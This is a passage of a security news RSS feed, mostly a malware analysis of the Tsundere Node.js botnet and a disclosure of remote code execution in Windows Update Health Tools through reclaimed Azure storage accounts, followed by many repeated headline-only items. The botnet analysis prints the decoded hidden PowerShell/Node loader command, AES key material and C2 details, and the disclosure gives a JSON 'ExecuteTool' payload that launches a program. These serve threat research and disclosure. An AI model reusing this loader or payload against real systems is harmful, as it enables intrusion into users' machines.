Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Blockchain and Node.js abused by Tsundere: an emerging botnet</title><link>https://securelist.com/tsundere-node-js-botnet-uses-ethereum-blockchain/117979/</link><author>Lisandro Ubiedo</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/17103518/tsundere-botnet-featured-image-150x150.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 10:00:13 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[Tsundere is a new botnet, discovered by our Kaspersky GReAT around mid-2025. We have correlated this threat with previous reports from October 2024 that reveal code similarities, as well as the use of the same C2 retrieval method and wallet. In that instance, the threat actor created malicious Node.js packages and used the Node Package Manager (npm) to deliver the payload. The packages were named similarly to popular packages, employing a technique known as typosquatting. The threat actor targeted libraries such as Puppeteer, Bignum.js, and various cryptocurrency packages, resulting in 287 identified malware packages. This supply chain attack affected Windows, Linux, and macOS users, but it was short-lived, as the packages were removed and the threat actor abandoned this infection method after being detected.The threat actor resurfaced around July 2025 with a new threat. We have dubbed it the Tsundere bot after its C2 panel. This botnet is currently expanding and poses an active threat to Windows users.Currently, there is no conclusive evidence on how the Tsundere bot implants are being spread. However, in one documented case, the implant was installed via a Remote Monitoring and Management (RMM) tool, which downloaded a file named  from a compromised website. In other instances, the sample names suggest that the implants are being disseminated using the lure of popular Windows games, particularly first-person shooters. The samples found in the wild have names such as “valorant”, “cs2”, or “r6x”, which appear to be attempts to capitalize on the popularity of these games among piracy communities.According to the C2 panel, there are two distinct formats for spreading the implant: via an MSI installer and via a PowerShell script. Implants are automatically generated by the C2 panel (as described in the Infrastructure section).The MSI installer was often disguised as a fake installer for popular games and other software to lure new victims. Notably, at the time of our research, it had a very low detection rate.The installer contains a list of data and JavaScript files that are updated with each new build, as well as the necessary Node.js executables to run these scripts. The following is a list of files included in the sample:nodejs/B4jHWzJnlABB2B7
nodejs/UYE20NBBzyFhqAQ.js
nodejs/79juqlY2mETeQOc
nodejs/thoJahgqObmWWA2
nodejs/node.exe
nodejs/npm.cmd
nodejs/npx.cmd
The last three files in the list are legitimate Node.js files. They are installed alongside the malicious artifacts in the user’s  directory.An examination of the CustomAction table reveals the process by which Windows Installer executes the malware and installs the Tsundere bot:RunModulesSetup 1058    NodeDir powershell -WindowStyle Hidden -NoLogo -enc JABuAG[...]ACkAOwAiAA==
After Base64 decoding, the command appears as follows:$nodePath = "$env:LOCALAPPDATA\nodejs\node.exe";
& $nodePath  - e "const { spawn } = require('child_process'); spawn(process.env.LOCALAPPDATA + '\\nodejs\\node.exe', ['B4jHWzJnlABB2B7'], { detached: true, stdio: 'ignore', windowsHide: true, cwd: __dirname }).unref();"
This will execute Node.js code that spawns a new Node.js process, which runs the loader JavaScript code (in this case, ). The resulting child process runs in the background, remaining hidden from the user.The loader script is responsible for ensuring the correct decryption and execution of the main bot script, which handles npm unpackaging and configuration. Although the loader code, similar to the code for the other JavaScript files, is obfuscated, it can be deobfuscated using open-source tools. Once executed, the loader attempts to locate the unpackaging script and configuration for the Tsundere bot, decrypts them using the AES-256 CBC cryptographic algorithm with a build-specific key and IV, and saves the decrypted files under different filenames.encScriptPath = 'thoJahgqObmWWA2',
  encConfigPath = '79juqlY2mETeQOc',
  decScript = 'uB39hFJ6YS8L2Fd',
  decConfig = '9s9IxB5AbDj4Pmw',
  keyBase64 = '2l+jfiPEJufKA1bmMTesfxcBmQwFmmamIGM0b4YfkPQ=',
  ivBase64 = 'NxrqwWI+zQB+XL4+I/042A==',
[...]
    const h = path.dirname(encScriptPath),
      i = path.join(h, decScript),
      j = path.join(h, decConfig)
    decryptFile(encScriptPath, i, key, iv)
    decryptFile(encConfigPath, j, key, iv)
The configuration file is a JSON that defines a directory and file structure, as well as file contents, which the malware will recreate. The malware author refers to this file as “config”, but its primary purpose is to package and deploy the Node.js package manager (npm) without requiring manual installation or downloading. The unpackaging script is responsible for recreating this structure, including the  directory with all its libraries, which contains packages necessary for the malware to run.With the environment now set up, the malware proceeds to install three packages to the  directory using npm:: a WebSocket networking library: a library for communicating with Ethereum: a Node.js process management toolLoader script installing the necessary toolset for Tsundere persistence and executionThe  package is installed to ensure the Tsundere bot remains active and used to launch the bot. Additionally,  helps achieve persistence on the system by writing to the registry and configuring itself to restart the process upon login.The PowerShell version of the infector operates in a more compact and simplified manner. Instead of utilizing a configuration file and an unpacker — as done with the MSI installer — it downloads the ZIP file node-v18.17.0-win-x64.zip from the official Node.js website  and extracts it to the  directory, ultimately deploying Node.js on the targeted device. The infector then uses the AES-256-CBC algorithm to decrypt two large hexadecimal-encoded variables, which correspond to the bot script and a persistence script. These decrypted files, along with a  file are written to the disk. The  file contains information about the malicious Node.js package, as well as the necessary libraries to be installed, including the  and  packages. Finally, the infector runs both scripts, starting with the persistence script that is followed by the bot script.The PowerShell infector creates a package file with the implant dependenciesPersistence is achieved through the same mechanism observed in the MSI installer: the script creates a value in the HKCU:\Software\Microsoft\Windows\CurrentVersion\Run registry key that points to itself. It then overwrites itself with a new script that is Base64 decoded. This new script is responsible for ensuring the bot is executed on each login by spawning a new instance of the bot.We will now delve into the Tsundere bot, examining its communication with the command-and-control (C2) server and its primary functionality.Web3 contracts, also known as smart contracts, are deployed on a blockchain via transactions from a wallet. These contracts can store data in variables, which can be modified by functions defined within the contract. In this case, the Tsundere botnet utilizes the Ethereum blockchain, where a method named  is defined to modify the state variable , allowing it to store a string. The string stored in  is used by the Tsundere botnet administrators to store new WebSocket C2 servers, which can be rotated at will and are immutable once written to the Ethereum blockchain.The Tsundere botnet relies on two constant points of reference on the Ethereum blockchain:Wallet: 0x73625B6cdFECC81A4899D221C732E1f73e504a32Contract: 0xa1b40044EBc2794f207D45143Bd82a1B86156c6bIn order to change the C2 server, the Tsundere botnet makes a transaction to update the state variable with a new address. Below is a transaction made on August 19, 2025, with a value of 0 ETH, which updates the address.Smart contract containing the Tsundere botnet WebSocket C2The state variable has a fixed length of 32 bytes, and a string of 24 bytes (see item [2] in the previous image) is stored within it. When this string is converted from hexadecimal to ASCII, it reveals the new WebSocket C2 server address: ws[:]//185.28.119[.]179:1234.To obtain the C2 address, the bot contacts various public endpoints that provide remote procedure call (RPC) APIs, allowing them to interact with Ethereum blockchain nodes. At the start of the script, the bot calls a function named , which iterates through a list of RPC providers. For each provider, it checks the transactions associated with the contract address and wallet owner, and then retrieves the string from the state variable containing the WebSocket address, as previously observed.Malware code for retrieval of C2 from the smart contractThe Tsundere bot verifies that the C2 address starts with either  or  to ensure it is a valid WebSocket URL, and then sets the obtained string as the server URL. But before using this new URL, the bot first checks the system locale by retrieving the culture name of the machine to avoid infecting systems in the CIS region. If the system is not in the CIS region, the bot establishes a connection to the server via a WebSocket, setting up the necessary handlers for receiving, sending, and managing connection states, such as errors and closed sockets.Bot handlers for communicationThe communication flow between the client (Tsundere bot) and the server (WebSocket C2) is as follows:The Tsundere bot establishes a WebSocket connection with the retrieved C2 address.An AES key is transmitted immediately after the connection is established.The bot sends an empty string to confirm receipt of the key.The server then sends an IV, enabling the use of encrypted communication from that point on.
Encryption is required for all subsequent communication.The bot transmits the OS information of the infected machine, including the MAC address, total memory, GPU information, and other details. This information is also used to generate a unique identifier (UUID).The C2 server responds with a JSON object, acknowledging the connection and confirming the bot’s presence.With the connection established, the client and server can exchange information freely.
To maintain the connection, keep-alive messages are sent every minute using ping/pong messages.The bot sends encrypted responses as part of the ping/pong messages, ensuring continuous communication.Tsundere communication process with the C2 via WebSocketsThe connections are not authenticated through any additional means, making it possible for a fake client to establish a connection.As previously mentioned, the client sends an encrypted ping message to the C2 server every minute, which returns a pong message. This ping-pong exchange serves as a mechanism for the C2 panel to maintain a list of currently active bots.The Tsundere bot is designed to allow the C2 server to send dynamic JavaScript code. When the C2 server sends a message with  to the bot, the message is evaluated as a new function and then executed. The result of this operation is sent back to the server via a custom function named , which is responsible for transmitting the result as a JSON object, encrypted for secure communication.Tsundere bot evaluation code once functions are received from the C2The ability to evaluate code makes the Tsundere bot relatively simple, but it also provides flexibility and dynamism, allowing the botnet administrators to adapt it to a wide range of actions.However, during our observation period, we did not receive any commands or functions from the C2 server, possibly because the newly connected bot needed to be requested by other threat actors through the botnet panel before it could be utilized.The Tsundere bot utilizes WebSocket as its primary protocol for establishing connections with the C2 server. As mentioned earlier, at the time of writing, the malware was communicating with the WebSocket server located at , and our tests indicated that it was responding positively to bot connections.The following table lists the IP addresses and ports extracted from the provided list of URLs:First seen (contract update)Marketplace and control panelNo business is complete without a marketplace, and similarly, no botnet is complete without a control panel. The Tsundere botnet has both a marketplace and a control panel, which are integrated into the same frontend.Tsundere botnet panel loginThe notable aspect of Tsundere’s control panel, dubbed “Tsundere Netto” (version 2.4.4), is that it has an open registration system. Any user who accesses the login form can register and gain access to the panel, which features various tabs:Bots: a dashboard displaying the number of bots under the user’s controlSettings: user settings and administrative functionsBuild: if the user has an active license, they can create new bots using the two previously mentioned methodologies (MSI or PowerShell)Market: this is the most interesting aspect of the panel, as it allows users to promote their individual bots and offer various services and functionalities to other threat actors. Each build can create a bot that performs a specific set of actions, which can then be offered to othersMonero wallet: a wallet service that enables users to make deposits or withdrawalsSocks proxy: a feature that allows users to utilize their bots as proxies for their trafficTsundere botnet control panel, building system and marketEach build generates a unique build ID, which is embedded in the implant and sent to the C2 server upon infection. This build ID can be linked to the user who created it. According to our research and analysis of other URLs found in the wild, builds are created through the panel and can be downloaded via the URL:hxxps://idk.1f2e[REDACTED]07a4[.]net/api/builds/{BUILD-ID}.msi.
At the time of writing this, the panel typically has between 90 and 115 bots connected to the C2 server at any given time.Based on the text found in the implants, we can conclude with high confidence that the threat actor behind the Tsundere botnet is likely Russian-speaking. The use of the Russian language in the implants is consistent with previous attacks attributed to the same threat actor.Russian being used throughout the codeFurthermore, our analysis suggests a connection between the Tsundere botnet and the 123 Stealer, a C++-based stealer available on the shadow market for $120 per month. This connection is based on the fact that both panels share the same server. Notably, the main domain serves as the frontend for the 123 Stealer panel, while the subdomain “idk.” is used for the Tsundere botnet panel.123 Stealer C2 panel sharing Tsundere’s infrastructure and showcasing its authorBy examining the available evidence, we can link both threats to a Russian-speaking threat actor known as “koneko”. Koneko was previously active on a dark web forum, where they promoted the 123 Stealer, as well as other malware, including a backdoor. Although our analysis of the backdoor revealed that it was not directly related to Tsundere, it shared similarities with the Tsundere botnet in that it was written in Node.js and used PowerShell or MSI as infectors. Before the dark web forum was seized and shut down, koneko’s profile featured the title “node malware senior”, further suggesting their expertise in Node.js-based malware.The Tsundere botnet represents a renewed effort by a presumably identified threat actor to revamp their toolset. The Node.js-based bot is an evolution of an attack discovered in October of last year, and it now features a new strategy and even a new business model. Infections can occur through MSI and PowerShell files, which provides flexibility in terms of disguising installers, using phishing as a point of entry, or integrating with other attack mechanisms, making it an even more formidable threat.Additionally, the botnet leverages a technique that is gaining popularity: utilizing web3 contracts, also known as “smart contracts”, to host command-and-control (C2) addresses, which enhances the resilience of the botnet infrastructure. The botnet’s possible author, koneko, is also involved in peddling other threats, such as the 123 Stealer, which suggests that the threat is likely to escalate rather than diminish in the coming months. As a result, it is essential to closely monitor this threat and be vigilant for related threats that may emerge in the near future.
%APPDATA%\Local\NodeJSNote: These are wallets that have changed the C2 address in the smart contract since it was created.
0x73625B6cdFECC81A4899D221C732E1f73e504a32
0x10ca9bE67D03917e9938a7c28601663B191E4413
0xEc99D2C797Db6E0eBD664128EfED9265fBE54579
0xf11Cb0578EA61e2EDB8a4a12c02E3eF26E80fc36
0xdb8e8B0ef3ea1105A6D84b27Fc0bAA9845C66FD7
0x10ca9bE67D03917e9938a7c28601663B191E4413
0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84
0x46b0f9bA6F1fb89eb80347c92c9e91BDF1b9E8CC]]></content:encoded></item><item><title>Multi-threat Android malware Sturnus steals Signal, WhatsApp messages</title><link>https://www.bleepingcomputer.com/news/security/multi-threat-android-malware-sturnus-steals-signal-whatsapp-messages/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 20 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A new Android banking trojan named Sturnus can capture communication from end-to-end encrypted messaging platforms like Signal, WhatsApp, and Telegram, as well as take complete control of the device. [...]]]></content:encoded></item><item><title>The OSINT playbook: Find your weak spots before attackers do</title><link>https://www.welivesecurity.com/en/privacy/osint-playbook-find-weak-spots-attackers-do/</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[Here’s how open-source intelligence helps trace your digital footprint and uncover your weak points, plus a few essential tools to connect the dots]]></content:encoded></item><item><title>NVIDIA Crushes AI Bubble Fears with Record $57B Revenue</title><link>https://securityonline.info/nvidia-crushes-ai-bubble-fears-with-record-57b-revenue/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 09:17:46 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            NVIDIA has released its financial report for the third quarter of fiscal year 2026, directly addressing mounting concerns about a potential AI bubble.
“Blackwell sales are off the charts, and cloud GP ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Iran-Linked Hackers Mapped Ship AIS Data Days Before Real-World Missile Strike Attempt</title><link>https://thehackernews.com/2025/11/iran-linked-hackers-mapped-ship-ais.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVj8J2nS9lYGZyFEqx7TaQVA9AtDdRKj5kb7gKdT1MipdOYmYLn3fcggw2zKHTxKKMvicuO3N7UFEj-QVsoDO-rcOe8JpfJwSCTjX9LcYQNA9iGxHTvQy3AXyFqJWAjhwf33_AH5bndm7rqeKwlkTwB37MhQ09RRfRB9PdYIvrFFKJl44vcP92df_PStz6/s1600/iran-hackers.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 07:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Threat actors with ties to Iran engaged in cyber warfare as part of efforts to facilitate and enhance physical, real-world attacks, a trend that Amazon has called cyber-enabled kinetic targeting.
The development is a sign that the lines between state-sponsored cyber attacks and kinetic warfare are increasingly blurring, necessitating the need for a new category of warfare, the tech giant's]]></content:encoded></item><item><title>When Updates Backfire: RCE in Windows Update Health Tools</title><link>https://research.eye.security/rce-windows-update-health-tools/</link><author>/u/vaizor</author><category>netsec</category><pubDate>Thu, 20 Nov 2025 07:16:20 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[What if a Microsoft‑tool meant to protect Windows machines, actually opened up remote code execution (RCE) by re-using abandoned Azure blobs?That’s exactly what we discovered in Microsoft’s Update Health Tools (KB4023057), designed to speed security updates via Intune. While its aim, to help in fast roll‑outs and emergency patches, is good, a flaw in its configuration meant many devices were exposed: attackers could trigger arbitrary code execution remotely.In this post, we’ll walk you through how we found this issue, how Microsoft has responded, and what you can do if your devices are still vulnerable. We’ll cover the original version 1.0, the attack vector we leveraged, evidence from real‑world telemetry, and how newer versions have tried to plug the gap.After reading WatchTowr’s deep dive on abandoned AWS S3 buckets earlier this year, we started wondering: how many Azure blob storage accounts could be silently dangling out there, just waiting to be claimed? So, we began looking, and started monitoring DNS traffic on our own Windows machines. And we found more than we expected.Among the pile of findings, which will be covered in later blogs, one stood out: payloadprod0.blob.core.windows.net . This finding kicked off what would become a deep dive into remote code execution through a signed Microsoft tool.Once we registered the storage account (), we began monitoring for inbound requests. Within hours, we were seeing hundreds of HTTP GET requests hitting the blobs, coming from all over the world. These requests targeted structured URIs like:GET /<hash>/enrolled.json  
GET /<hash>/Devices/<hash>.jsonAll with a consistent user agent: . What could that be?Digging deeper, we queried EDR telemetry and found that , a Microsoft-signed binary known as the Update Health Service, was actively resolving these domains across multiple customer environments. This service lived in: C:\Program Files\Microsoft Update Health Tools\uhssvc.exe. Later, we found out that the Azure storage accounts used, followed a predictable naming pattern: payloadprod0.blob.core.windows.net through payloadprod15.blob.core.windows.net. When we checked, 10 of those 15 blobs were still unregistered. So we claimed them and started watching thousands of similar requests flowing in from all over the world.The obvious next step? Figure out what these endpoints were trying to fetch, and whether we could influence what they received.To understand , we first needed to trace how  actually works. Let’s start with the original version 1.0 of the update health tools. After some reverse engineering, we developed a hypothesis that the team within Microsoft writing this tool, probably needed an easy service to check which updates to install. They apparently decided to use Azure blob storages, with a container per tenant and a few JSON files to specify the configuration.So what does  do, exactly?A new installation will start by checking if it’s Entra joined/registered. If not, it will simply stop as this is an enterprise tool.The service checks whether this Entra tenant is enrolled into update management by downloading a file from /<tenant_hash>/enrolled.json and checking whether  is set to  in this JSON.If the tenant is enrolled it will continue the process of enrolling itself. This means downloading another JSON from /<tenant_hash>/Devices/<device_id_hash>.json with only a single field containing the policy ID assigned to this computer.After that, the Update Health Tools will start polling /<tenant_hash>/Policies/<policy_id>/<cpu>_<osbuild>.json .It will then look at  to determine what to do.Opening up the binary in IDA gives us an easy list of actions we can specify:Our interest was immediately piqued by the “ExecuteTool” option. That sounds like an easy way to get code execution.Scrolling through the <strong>WSD::ToolExecutor::Execute</strong> function we see our first hurdleIt looks like we can only execute a Microsoft signed binary. Diving a bit deeper, we see that we actually need an executable with an embedded signature that’s signed by Microsoft. These are more rare, since most default windows executable are signed using catalog files. With catalog files you can sign a list of executables instead of signing each executable individually. This allows Microsoft to optimise checking of signatures and saves disk space.Luckily there’s an easy target on each windows installation: . But then we hit a new roadblocker.We were excited having found remote code execution in v1.0, and wanted to test it. Unfortunately for us, Microsoft no longer offers version v1.0 from February 2021 for download. Instead, it gives you v1.1 from December 2022. Still determined to get RCE in the latest version, we opened it up in IDA and found a second implementation for getting the config. 😃No longer content with using simple Blob Storage, the developers apparently decided to implement a real web service in v1.1 at devicelistenerprod.microsoft.com. Furthermore, they added new storage accounts specifically designed for EU customers and a 2nd copy of the webservice at  and devicelistenerprod.eudb.microsoft.com. We weren’t able to register any of these storage accounts, nor these domain names.So apparently we won’t have RCE inside the EU, which means all of our European customers at Eye Security are safe! 😉After some more reversing of v1.1, we unlocked the option of re-enabling the old blob storage based communication by setting the configuration parameter  to 1 in the registry. While also allowing us to test from the EU by changing UHS.STORAGEACCOUNTENDPOINTEUDB to a storage account we control.Remote Code Execution (RCE)So, for the old-school experience of popping a calc, we created the following JSON as payload.{
  "RequestId": "00000000-0000-0000-0000-000000000001",
  "EnterpriseActionType": "ExecuteTool",
  "EnterpriseExecutableClientPath": "..\\..\\Windows\\explorer.exe",
  "EnterpriseExecutableClientParameters": "/root,C:\\Windows\\system32\\calc.exe",
  "EnterpriseExecutableClientPayload": []
}Which produced the expected result when testing:Overall impact of this vulnOf course, we didn’t try this on any machine we didn’t own, but we could use the access logs of Azure Blob storage to see how many machines we could have accessed. For this we’ve collected logs for 7 days of traffic to the 10 storage accounts we registered.In that period, we’ve seen  from the Update Health Tools. These are coming from 9.976 unique Azure tenants. Of these, we noticed  asking whether they should enroll. For these requests, we can’t distinguish whether it’s a single machine in this tenant or a whole fleet of machines. The devices looking for their configured policy can be individually identified. These are coming from  and .Given the enormous install base of Windows, this is of course a tiny fraction of machines still running the old (1.0) version of Update Health Tools or having the backward compatible flag enabled for the newer version.We reported this vulnerability to Microsoft on July 7 2025 and they confirmed the behavior on July 17. We successfully transferred ownership of these storage accounts to Microsoft on July 18. Therefore all endpoints should be safe now.After seeing what impact this issue had, it’s of course good to reflect how secure design principles can be used to avoid such issues in the future. The obvious way to avoid such issues is of course to not remove azure storage accounts or domains that publicly released software connects to. You can keep storage accounts reserved and linked to your tenant with all data removed and public access disabled. This makes sure no attacker can register the account, while also providing ease of mind that no data can leak and no unexpected bills will arrive.Looking a bit further into the root cause we see that the developers are confusing transport security with message security. It’s easy to be tricked into believing that since Microsoft owns the storage account and the certificates for the associated, the data received from the server can be trusted. This only means that the data was securely transmitted from public Azure services. What they should have done is sign the messages themselves. That way no matter who owns the storage account or has the ability to generate SSL certificates, they can still verify that the commands to be executed are signed by the correct Microsoft team.]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into 